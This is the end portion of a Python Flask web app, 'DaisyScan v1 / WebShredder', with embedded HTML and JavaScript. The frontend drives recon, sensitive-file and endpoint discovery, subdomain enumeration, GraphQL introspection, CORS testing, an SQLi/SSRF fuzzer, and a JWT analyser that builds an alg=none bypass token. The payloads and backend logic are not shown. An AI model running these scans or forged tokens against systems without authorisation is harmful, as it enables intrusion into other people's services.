  found:'найдено',checked:'проверено',confirmed:'Подтверждено',suspicious:'Подозрительно',forbidden:'Запрещено',
}
};

let lang='en';

function t(k){return(I18N[lang]&&I18N[lang][k])||I18N.en[k]||k}

function setLang(l){
  lang=l;
  document.querySelectorAll('.lang-btn').forEach((b,i)=>b.classList.toggle('active',['en','id','ru'][i]===l));
  document.querySelectorAll('[data-i18n]').forEach(el=>el.textContent=t(el.getAttribute('data-i18n')));
}

function sw(name){
  const tabs=['recon','files','endpoints','subdomains','graphql','cors','fuzzer','about'];
  document.querySelectorAll('.tab-panel').forEach(p=>p.classList.remove('active'));
  document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
  document.getElementById('tab-'+name).classList.add('active');
  document.querySelectorAll('.tab-btn')[tabs.indexOf(name)].classList.add('active');
}

function updateFuzzUI(){
  const v=document.getElementById('fuzz-type').value;
  document.getElementById('sqli-extra').style.display=v==='sqli'?'block':'none';
  document.getElementById('ssrf-extra').style.display=v==='ssrf'?'block':'none';
}

function setScan(id,on){
  const btn=document.getElementById(id+'-btn');
  if(btn) btn.disabled=on;
  const sp=document.getElementById(id+'-spin');
  if(sp) sp.style.display=on?'inline-block':'none';
  const bar=document.getElementById(id+'-bar');
  if(bar) bar.classList.toggle('show',on);
  const st=document.getElementById(id+'-st');
  if(st){st.className='status-line'+(on?' st-run':'');st.textContent=on?t('scanning'):''}
}

function setSt(id,type,msg){
  const el=document.getElementById(id+'-st');
  if(el){el.className='status-line st-'+type;el.textContent=msg}
  const bar=document.getElementById(id+'-bar');
  if(bar) bar.classList.remove('show');
}

function clearVal(id){
  const el=document.getElementById(id);
  if(el) el.className='val-box';
}

async function valUrl(inputId,valId){
  const url=(document.getElementById(inputId)||{}).value||'';
  if(!url) return;
  const el=document.getElementById(valId);
  if(!el) return;
  el.className='val-box';
  el.innerHTML='⏳ Checking...';el.style.display='flex';
  try{
    const r=await fetch('/api/validate',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url})});
    const d=await r.json();
    el.className='val-box '+(d.valid?'ok':'err');
    el.innerHTML=(d.valid?'✓ ':'✗ ')+e(d.message);
  }catch(ex){
    el.className='val-box err';el.innerHTML='✗ '+e(ex.message);
  }
}

function bdg(txt,cls){return`<span class="badge ${cls}">${txt}</span>`}
function sevBdg(s){return bdg(s,s==='CRITICAL'?'b-crit':s==='HIGH'?'b-high':s==='MEDIUM'?'b-med':s==='LOW'?'b-low':'b-info')}
function statCls(c){if(c>=200&&c<300)return's200';if(c>=300&&c<400)return's30x';if(c>=400&&c<500)return's40x';return's50x'}
function fmt(b){return b<1024?b+'B':(b/1024).toFixed(1)+'KB'}
function e(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;')}

function copyTxt(txt){
  navigator.clipboard.writeText(txt).catch(()=>{
    const ta=document.createElement('textarea');ta.value=txt;document.body.appendChild(ta);ta.select();document.execCommand('copy');document.body.removeChild(ta);
  });
}

async function runRecon(){
  const url=document.getElementById('recon-url').value.trim();
  if(!url)return;
  setScan('recon',true);
  document.getElementById('recon-out').innerHTML='';
  try{
    const r=await fetch('/api/recon',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url})});
    const d=await r.json();
    if(d.error){setSt('recon','err',t('err')+': '+d.error);return}
    setSt('recon','ok',t('done'));
    renderRecon(d);
  }catch(ex){setSt('recon','err',t('err')+': '+ex.message)}
  finally{setScan('recon',false)}
}

function renderRecon(d){
  const techs=d.technologies.length?d.technologies.map(x=>`<span class="stag">${e(x)}</span>`).join(' '):`<span class="c-info">Unknown</span>`;
  const wafs=d.waf.length?d.waf.map(w=>bdg(w,'b-warn')).join(' '):`<span class="c-ok">None detected</span>`;
  let sec='';
  for(const[k,v]of Object.entries(d.security_headers||{})){
    const ok=v!=='MISSING';
    sec+=`<div class="ri"><span class="rk">${e(k)}</span><span class="${ok?'c-ok':'c-vuln'}">${e(v)}</span></div>`;
  }
  let hdrs='';
  for(const[k,v]of Object.entries(d.headers||{}).slice(0,18))
    hdrs+=`<div class="ri"><span class="rk">${e(k)}</span><span class="rv">${e(v)}</span></div>`;
  const redir=d.redirects&&d.redirects.length?d.redirects.map(r=>`<div class="ri"><span class="${statCls(r.status)}">${r.status}</span><span class="rv" style="margin-left:8px">${e(r.url)}</span></div>`).join(''):`<span class="c-info">None</span>`;
  const inter=d.interesting&&d.interesting.length?d.interesting.map(i=>`<div class="ri"><span style="color:var(--yw)">⚡ ${e(i)}</span></div>`).join(''):`<span class="c-info">None</span>`;
  let ssl='';
  if(d.ssl&&d.ssl.subject){
    ssl=`<div class="ri"><span class="rk">Subject</span><span class="rv">${e(JSON.stringify(d.ssl.subject))}</span></div>
         <div class="ri"><span class="rk">Issuer</span><span class="rv">${e(JSON.stringify(d.ssl.issuer))}</span></div>
         <div class="ri"><span class="rk">Valid From</span><span class="rv">${e(d.ssl.notBefore)}</span></div>
         <div class="ri"><span class="rk">Valid Until</span><span class="rv">${e(d.ssl.notAfter)}</span></div>`;
    if(d.ssl.san&&d.ssl.san.length)ssl+=`<div class="ri"><span class="rk">SAN</span><span class="rv">${e(d.ssl.san.join(', '))}</span></div>`;
  }else if(d.ssl&&d.ssl.error)ssl=`<div class="ri"><span class="rk">Error</span><span class="tag-w">${e(d.ssl.error)}</span></div>`;

  const dns=d.dns||{};
  document.getElementById('recon-out').innerHTML=`
    <div class="g3" style="margin-bottom:14px">
      <div class="stat-card"><div class="stat-num ${statCls(d.status||0)}">${d.status||'—'}</div><div class="stat-label">HTTP Status</div></div>
      <div class="stat-card"><div class="stat-num" style="font-size:1.1rem">${e(d.server||'Unknown')}</div><div class="stat-label">Server</div></div>
      <div class="stat-card"><div class="stat-num" style="font-size:1rem">${e(dns.ip||'N/A')}</div><div class="stat-label">IP Address</div></div>
    </div>
    <div class="card">
      <div class="ri"><span class="rk">URL</span><span class="rv">${e(d.url)}</span></div>
      <div class="ri"><span class="rk">Technologies</span><div style="display:flex;flex-wrap:wrap;gap:4px">${techs}</div></div>
      <div class="ri"><span class="rk">WAF</span><div>${wafs}</div></div>
      <div class="ri"><span class="rk">DNS Hostname</span><span class="rv">${e(dns.hostname||'N/A')}</span></div>
      ${dns.all_ips&&dns.all_ips.length>1?`<div class="ri"><span class="rk">All IPs</span><span class="rv">${e((dns.all_ips||[]).join(', '))}</span></div>`:''}
    </div>
    <div class="card"><div class="card-title">Security Headers</div><div class="res-box">${sec}</div></div>
    ${ssl?`<div class="card"><div class="card-title">SSL / TLS</div><div class="res-box">${ssl}</div></div>`:''}
    <div class="card"><div class="card-title">⚡ Interesting Findings</div><div class="res-box">${inter}</div></div>
    ${d.redirects&&d.redirects.length?`<div class="card"><div class="card-title">Redirects</div><div class="res-box">${redir}</div></div>`:''}
    <div class="card"><div class="card-title">Response Headers</div><div class="res-box">${hdrs}</div></div>`;
}

async function runFiles(){
  const url=document.getElementById('files-url').value.trim();
  if(!url)return;
  setScan('files',true);
  document.getElementById('files-out').innerHTML='';
  try{
    const r=await fetch('/api/sensitive-files',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url})});
    const d=await r.json();
    if(d.error){setSt('files','err',t('err')+': '+d.error);return}
    const tot=d.confirmed.length+d.suspicious.length;
    setSt('files','ok',`${t('done')} — ${d.confirmed.length} ${t('confirmed')}, ${d.suspicious.length} ${t('suspicious')}, ${d.forbidden.length} ${t('forbidden')} / ${d.total_checked} ${t('checked')}`);
    renderFiles(d);
  }catch(ex){setSt('files','err',t('err')+': '+ex.message)}
  finally{setScan('files',false)}
}

function renderFiles(d){
  const svMap={critical:'b-crit',high:'b-high',medium:'b-med',low:'b-low',info:'b-info'};

  function renderList(items){
    if(!items.length) return `<span class="c-info">None</span>`;
    return items.map(f=>{
      const sv=svMap[f.severity]||'b-info';
      return `<div class="file-entry">
        <div class="file-meta">${bdg(f.severity.toUpperCase(),sv)} <span class="c-hl">${e(f.path)}</span> <span class="c-info" style="font-size:.68rem">${fmt(f.size||0)}</span></div>
        <div class="c-info" style="font-size:.71rem;margin-bottom:3px">${e(f.label||'')}</div>
        <div class="file-url">🔗 <a href="${e(f.url)}" target="_blank" rel="noopener">${e(f.url)}</a></div>
        ${f.snippet?`<div class="file-snip">${e(f.snippet)}</div>`:''}
        ${f.note?`<div style="font-size:.68rem;color:var(--yw);margin-top:4px">⚠ ${e(f.note)}</div>`:''}
      </div>`;
    }).join('');
  }

  function renderForbidden(items){
    if(!items.length) return '';
    const rows=items.map(f=>`<div class="file-entry">
      <div class="file-meta">${bdg(String(f.status),'b-warn')} <span class="rv">${e(f.path)}</span></div>
      <div class="file-url">🔗 <a href="${e(f.url)}" target="_blank" rel="noopener">${e(f.url)}</a></div>
      <div style="font-size:.68rem;color:var(--yw);margin-top:3px">${e(f.note||'')}</div>
    </div>`).join('');
    return `<div class="card"><div class="card-title">🟡 ${t('forbidden')}: ${items.length}</div><div class="res-box">${rows}</div></div>`;
  }

  document.getElementById('files-out').innerHTML=`
    <div class="card">
      <div class="card-title">🔴 ${t('confirmed')}: ${d.confirmed.length}</div>
      <div class="res-box">${renderList(d.confirmed)||`<span class="c-ok">✓ ${t('noVuln')}</span>`}</div>
    </div>
    ${d.suspicious.length?`<div class="card"><div class="card-title">🟡 ${t('suspicious')} (manual verify): ${d.suspicious.length}</div><div class="res-box">${renderList(d.suspicious)}</div></div>`:''}
    ${renderForbidden(d.forbidden)}`;
}

async function runEndpoints(){
  const url=document.getElementById('endpoints-url').value.trim();
  if(!url)return;
  setScan('endpoints',true);
  document.getElementById('endpoints-out').innerHTML='';
  try{
    const r=await fetch('/api/endpoints',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url})});
    const d=await r.json();
    if(d.error){setSt('endpoints','err',t('err')+': '+d.error);return}
    setSt('endpoints','ok',`${t('done')} — ${d.found} ${t('found')} / ${d.total_checked} ${t('checked')}`);
    renderEndpoints(d);
  }catch(ex){setSt('endpoints','err',t('err')+': '+ex.message)}
  finally{setScan('endpoints',false)}
}

function renderEndpoints(d){
  if(!d.endpoints||!d.endpoints.length){
    document.getElementById('endpoints-out').innerHTML=`<div class="card"><span class="c-ok">✓ No active endpoints found</span></div>`;return;
  }
  let html='';
  for(const ep of d.endpoints){
    const sc=ep.status===200?'b-crit':ep.status===403||ep.status===401?'b-high':ep.status>=300&&ep.status<400?'b-med':'b-info';
    html+=`<div class="ep-entry">
      ${bdg(ep.status,sc)}
      <span class="ep-path ${ep.interesting?'c-vuln':'c-hl'}">${e(ep.path)}</span>
      <div class="ep-meta">
        <span class="c-info" style="font-size:.67rem">${fmt(ep.size)}</span>
        <span class="c-info" style="font-size:.67rem">${e(ep.content_type)}</span>
        ${ep.redirect_to?`<span style="font-size:.66rem;color:var(--cy)">→ ${e(ep.redirect_to.slice(0,60))}</span>`:''}
      </div>
    </div>`;
  }
  document.getElementById('endpoints-out').innerHTML=`<div class="card"><div class="card-title">${t('found')}: ${d.found} / ${d.total_checked} ${t('checked')}</div><div class="res-box">${html}</div></div>`;
}

async function runSub(){
  const url=document.getElementById('sub-url').value.trim();
  if(!url)return;
  setScan('sub',true);
  document.getElementById('sub-out').innerHTML='';
  try{
    const r=await fetch('/api/subdomains',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url})});
    const d=await r.json();
    if(d.error){setSt('sub','err',t('err')+': '+d.error);return}
    setSt('sub','ok',`${t('done')} — ${d.count} live subdomains / ${d.total_checked} ${t('checked')}`);
    renderSub(d);
  }catch(ex){setSt('sub','err',t('err')+': '+ex.message)}
  finally{setScan('sub',false)}
}

function renderSub(d){
  if(!d.alive||!d.alive.length){
    document.getElementById('sub-out').innerHTML=`<div class="card"><span class="c-info">✓ ${t('noSub')} for ${e(d.base_domain)}</span></div>`;return;
  }
  let html='';
  for(const s of d.alive){
    const sc=s.status===200?'b-ok':s.status===301||s.status===302?'b-med':'b-info';
    const techs=s.tech&&s.tech.length?s.tech.map(t=>`<span class="stag" style="font-size:.6rem">${e(t)}</span>`).join(' '):'';
    html+=`<div class="sub-entry">
      ${bdg(s.status,sc)}
      <div style="flex:1;min-width:0">
        <div class="sub-host">${e(s.hostname)}</div>
        <div class="sub-meta">
          <span>${e(s.ip)}</span>
          ${s.server?`<span>${e(s.server)}</span>`:''}
          ${s.title?`<span class="c-hl" style="font-style:italic">${e(s.title)}</span>`:''}
          <span>${fmt(s.size)}</span>
        </div>
        ${techs?`<div style="display:flex;flex-wrap:wrap;gap:3px;margin-top:4px">${techs}</div>`:''}
      </div>
      <a href="${e(s.url)}" target="_blank" rel="noopener" class="btn btn-sm" style="flex-shrink:0">→ Visit</a>
    </div>`;
  }
  document.getElementById('sub-out').innerHTML=`<div class="card"><div class="card-title">🟢 Live Subdomains: ${d.count} of ${d.total_checked} checked</div><div class="res-box">${html}</div></div>`;
}

async function runGQL(){
  const url=document.getElementById('gql-url').value.trim();
  if(!url)return;
  setScan('gql',true);
  document.getElementById('gql-out').innerHTML='';
  try{
    const r=await fetch('/api/graphql',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url})});
    const d=await r.json();
    if(d.error){setSt('gql','err',t('err')+': '+d.error);return}
    setSt('gql','ok',t('done'));
    renderGQL(d);
  }catch(ex){setSt('gql','err',t('err')+': '+ex.message)}
  finally{setScan('gql',false)}
}

function renderGQL(d){
  let vulns='';
  for(const v of d.vulnerabilities||[]){
    vulns+=`<div class="ri" style="gap:8px">${sevBdg(v.severity)}<span style="margin-left:4px">${e(v.issue)}</span></div>`;
  }
  const eps=(d.endpoints_found||[]).map(ep=>`<div class="ri"><span class="${statCls(ep.status)}">${ep.status}</span><span class="rv" style="margin-left:8px">${e(ep.url)}</span>${ep.is_graphql?bdg('GraphQL','b-ok'):''}</div>`).join('')||`<span class="c-info">None found</span>`;
  const types=(d.schema_types||[]).map(t=>`<span class="stag">${e(t)}</span>`).join(' ');
  document.getElementById('gql-out').innerHTML=`
    <div class="card">
      <div class="ri"><span class="rk">Introspection</span><span class="${d.introspection==='ENABLED'?'c-vuln':'c-ok'}">${e(d.introspection||'Not tested')}</span></div>
      <div class="ri"><span class="rk">Endpoints found</span><div style="flex:1">${eps}</div></div>
      ${types?`<div class="ri"><span class="rk">Exposed Types (${d.schema_types.length})</span><div style="display:flex;flex-wrap:wrap;gap:3px;margin-top:4px">${types}</div></div>`:''}
    </div>
    ${vulns?`<div class="card"><div class="card-title">Vulnerabilities</div><div class="res-box">${vulns}</div></div>`:''}`;
}

async function runJWT(){
  const tok=document.getElementById('jwt-tok').value.trim();
  if(!tok)return;
  document.getElementById('jwt-btn').disabled=true;
  document.getElementById('jwt-spin').style.display='inline-block';
  document.getElementById('jwt-out').innerHTML='';
  try{
    const r=await fetch('/api/jwt',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:tok})});
    const d=await r.json();
    if(d.error){document.getElementById('jwt-out').innerHTML=`<div class="card"><span class="c-vuln">${e(d.error)}</span></div>`;return}
    let issues='';
    for(const i of d.issues||[])
      issues+=`<div class="ri">${sevBdg(i.severity)}<span style="margin-left:7px">${e(i.issue)}</span></div>`;
    const noneToken=d.attacks&&d.attacks.none_bypass?d.attacks.none_bypass:'';
    document.getElementById('jwt-out').innerHTML=`
      <div class="g2">
        <div class="card"><div class="card-title">Header</div><pre class="jd">${e(JSON.stringify(d.header,null,2))}</pre></div>
        <div class="card"><div class="card-title">Payload</div><pre class="jd">${e(JSON.stringify(d.payload,null,2))}</pre></div>
      </div>
      <div class="card"><div class="card-title">Security Analysis</div><div class="res-box">${issues||'<span class="c-info">No issues detected</span>'}</div></div>
      ${noneToken?`<div class="card"><div class="card-title">alg=none Bypass Token <button class="copy-btn" onclick="copyTxt('${e(noneToken)}')">Copy</button></div><pre class="jd" style="word-break:break-all;font-size:.65rem">${e(noneToken)}</pre><div class="c-info" style="font-size:.68rem;margin-top:6px">${e((d.attacks||{}).description||'')}</div></div>`:''}
      ${d.attacks&&d.attacks.alg_confusion?`<div class="card"><div class="card-title">Algorithm Confusion</div><div class="c-warn" style="font-size:.74rem">${e(d.attacks.alg_confusion)}</div></div>`:''}`;
  }catch(ex){document.getElementById('jwt-out').innerHTML=`<div class="card"><span class="c-vuln">${e(ex.message)}</span></div>`}
  finally{document.getElementById('jwt-btn').disabled=false;document.getElementById('jwt-spin').style.display='none'}
}

async function runCORS(){
  const url=document.getElementById('cors-url').value.trim();
  if(!url)return;
  setScan('cors',true);
  document.getElementById('cors-out').innerHTML='';
  try{
    const r=await fetch('/api/cors',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url})});
    const d=await r.json();
    if(d.error){setSt('cors','err',t('err')+': '+d.error);return}
    const vCnt=(d.results||[]).filter(r=>r.vulnerable).length;
    setSt('cors','ok',`${t('done')} — ${vCnt} misconfigurations found`);
    let html='';
    for(const res of d.results||[]){
      if(!res.ACAO||res.ACAO==='Not set')continue;
      const sc=res.severity==='CRITICAL'?'b-crit':res.severity==='HIGH'?'b-high':res.severity==='MEDIUM'?'b-med':'b-info';
      html+=`<div class="cors-row">
        <div class="cors-head">${res.vulnerable?bdg(res.severity,''+sc):bdg('OK','b-ok')}<span class="c-info" style="font-size:.72rem">${e(res.origin_tested)}</span>${res.exploitable?bdg('EXPLOITABLE','b-crit'):''}</div>
        <div class="cors-detail">
          <span>ACAO: <span class="${res.ACAO===res.origin_tested?'c-vuln':'c-hl'}">${e(res.ACAO)}</span></span>
          <span>Creds: <span class="${res.ACAC==='true'?'c-vuln':'c-ok'}">${e(res.ACAC)}</span></span>
          <span>Methods: <span class="rv">${e(res.ACAM||'—')}</span></span>
        </div>
        ${res.issue?`<div class="${res.vulnerable?'c-vuln':'c-info'}" style="font-size:.71rem;margin-top:4px">${e(res.issue)}</div>`:''}
      </div>`;
    }
    let pf='';
    if(d.preflight&&d.preflight.status){
      pf=`<div class="card" style="margin-top:0"><div class="card-title">OPTIONS Preflight Response</div>
        <div class="ri"><span class="rk">Status</span><span class="${statCls(d.preflight.status)}">${d.preflight.status}</span></div>
        <div class="ri"><span class="rk">ACAO</span><span class="rv">${e(d.preflight.ACAO)}</span></div>
        <div class="ri"><span class="rk">ACAM</span><span class="rv">${e(d.preflight.ACAM)}</span></div>
        <div class="ri"><span class="rk">ACAH</span><span class="rv">${e(d.preflight.ACAH)}</span></div>
        <div class="ri"><span class="rk">ACAC</span><span class="${d.preflight.ACAC==='true'?'c-vuln':'c-ok'}">${e(d.preflight.ACAC)}</span></div>
      </div>`;
    }
    document.getElementById('cors-out').innerHTML=`<div class="card"><div class="card-title">CORS Test Results</div><div class="res-box">${html||'<span class="c-ok">No CORS issues found</span>'}</div></div>${pf}`;
  }catch(ex){setSt('cors','err',t('err')+': '+ex.message)}
  finally{setScan('cors',false)}
}

async function runFuzzer(){
  const url=document.getElementById('fuzz-url').value.trim();
  const type=document.getElementById('fuzz-type').value;
  const param=document.getElementById('fuzz-param').value.trim();
  const ssrfParam=document.getElementById('fuzz-ssrf-param').value.trim();
  if(!url)return;
  setScan('fuzz',true);
  document.getElementById('fuzz-out').innerHTML='';
  try{
    const r=await fetch('/api/fuzzer',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url,type,param,ssrf_param:ssrfParam})});
    const d=await r.json();
    if(d.error){setSt('fuzz','err',t('err')+': '+d.error);return}
    const confCnt=(d.results||[]).filter(r=>r.confirmed||r.bypass_detected).length;
    setSt('fuzz','ok',`${t('done')} — ${confCnt} confirmed findings`);
    let html='';
    for(const res of d.results||[]){
      const isConf=res.confirmed||res.bypass_detected;
      html+=`<div class="ri" style="flex-direction:column;gap:5px;padding:10px 0">
        <div style="display:flex;gap:7px;align-items:center;flex-wrap:wrap">
          ${isConf?bdg('CONFIRMED','b-high'):bdg('Tested','b-info')}
          <span class="${statCls(res.status||0)}">${res.status||'—'}</span>
          <code style="font-size:.68rem;color:var(--pl);word-break:break-all;max-width:350px">${e(res.payload||res.technique||res.label||'')}</code>
          ${res.size!==undefined?`<span class="c-info" style="font-size:.65rem">${fmt(res.size)}</span>`:''}
          ${res.time!==undefined?`<span class="c-info" style="font-size:.65rem">${res.time}s</span>`:''}
        </div>
        ${(res.indicators||[]).map(i=>`<div class="c-vuln" style="font-size:.69rem">⚠ ${e(i)}</div>`).join('')}
        ${res.snippet?`<div class="file-snip">${e(res.snippet)}</div>`:''}
      </div>`;
    }
    if(!html) html=`<span class="c-ok">✓ No confirmed findings for ${e(type)}</span>`;
    document.getElementById('fuzz-out').innerHTML=`<div class="card"><div class="card-title">${type.toUpperCase()} Results — ${(d.results||[]).length} tested, ${confCnt} confirmed</div><div class="res-box">${html}</div></div>`;
  }catch(ex){setSt('fuzz','err',t('err')+': '+ex.message)}
  finally{setScan('fuzz',false)}
}
</script>
</body>
</html>'''

if __name__ == '__main__':
    print('''
╔══════════════════════════════════════════════╗
║                🌸 DaisyScan v1                        ║
║                  WebShredder                          ║
║                                                       ║                                                       
║               by KaisarYetiandi                       ║
║            github.com/KaisarYetiandi                  ║
║              t.me/Darkness_Lock                       ║
╠══════════════════════════════════════════════╣
║  Target: http://localhost:5000                        ║
╚══════════════════════════════════════════════╝
    ''')
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
    
